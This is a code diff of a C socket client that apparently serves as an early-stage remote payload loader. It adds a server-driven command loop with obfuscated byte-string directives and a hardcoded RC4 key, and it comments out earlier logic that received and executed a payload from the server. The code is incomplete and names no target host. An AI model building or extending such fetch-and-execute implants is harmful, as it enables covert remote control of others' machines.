@@ -7,25 +7,43 @@
 #include <sys/socket.h>
 #include <netdb.h>
 #include <netinet/in.h>
-#include <signal.h>
 #include <fcntl.h>
 #include "rc4.h"
 
-int soc;
-
-void sigint_handler(int s){
-    printf("Received CTRL-C\n");
-    send(soc, "quit", 5, 0);
-    close(soc);
-    exit(1);
-}
+// Define the communication directives
+#define NET_EXIT 0
+#define NET_GET  1
+#define NET_OK   2
 
 int recv_payload(int sfd);
 int exec_payload();
 
+int interpret_server_response(char *response){
+    if (strcmp(response, "\xef\xbe") == 0)
+        return NET_EXIT;
+    if (strcmp(response, "get") == 0)
+        return NET_GET;
+    return -1;
+}
+
+void send_ack(int directive, int soc){
+    switch (directive){
+        case NET_EXIT:
+            send(soc, "\xbe\xba\0", 3, 0);
+            break;
+        case NET_GET:
+            send(soc, "\xad\xde\0", 3, 0);
+            break;
+        
+        default:
+            send(soc, "\xff\xff\0", 3, 0);
+            break;
+    }
+}
+
 char *key = "LECNAAEAAE";
 int main(int agrc, char **argv){
-    int status;
+    int status, soc;
     struct addrinfo hints;
     struct addrinfo *servinfo;
 
@@ -51,39 +69,49 @@ int main(int agrc, char **argv){
         exit(EXIT_FAILURE);
     }
 
-    struct sigaction sigIntHandler;
-
-    sigIntHandler.sa_handler = sigint_handler;
-    sigemptyset(&sigIntHandler.sa_mask);
-    sigIntHandler.sa_flags = 0;
-
-    sigaction(SIGINT, &sigIntHandler, NULL);
     freeaddrinfo(servinfo);
 
     char BUF[1024];
+    ssize_t recvn;
     while (1){
         memset(BUF, 0, 1024);
+        recvn = recv(soc, BUF, 1024, 0);
+        if (recvn == 0)
+            continue;
+        puts(BUF);
+        switch (interpret_server_response(BUF)){
+            case NET_EXIT:
+                send_ack(NET_EXIT, soc);
+                close(soc);
+                exit(EXIT_SUCCESS);
+            case NET_GET:
+                send_ack(NET_GET, soc);
+                //recv_payload
+                break;
+            default:
+                send_ack(NET_OK, soc);
+                break;
+        }
+        // scanf("%1023[^\n]", BUF);
+        // // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
+        // getchar();
+        // ssize_t sendn = send(soc, BUF, strlen(BUF), 0);
+        // if (sendn == -1){
+        //     perror("Failed to send");
+        //     exit(EXIT_FAILURE);
+        // }
+        // ssize_t recvn = recv(soc, BUF, strlen(BUF), 0);
+        // if (strcmp(BUF, "aa") == 0) { 
+        //     close(soc);
+        //     exit(1);
+        // }
+        // else if (strcmp(BUF, "bb") == 0) { 
+        //     int recvStatus = recv_payload(soc);
 
-        scanf("%1023[^\n]", BUF);
-        // rc4((unsigned char *)key, strlen(key), BUF, strlen(BUF));
-        getchar();
-        ssize_t sendn = send(soc, BUF, strlen(BUF), 0);
-        if (sendn == -1){
-            perror("Failed to send");
-            exit(EXIT_FAILURE);
-        }
-        ssize_t recvn = recv(soc, BUF, strlen(BUF), 0);
-        if (strcmp(BUF, "aa") == 0) { 
-            close(soc);
-            exit(1);
-        }
-        else if (strcmp(BUF, "bb") == 0) { 
-            int recvStatus = recv_payload(soc);
-
-            if (recvStatus == 1) exec_payload();
-            else puts("tibau");
-        }
-        else continue;
+        //     if (recvStatus == 1) exec_payload();
+        //     else puts("tibau");
+        // }
+        // else continue;
 
     }
     
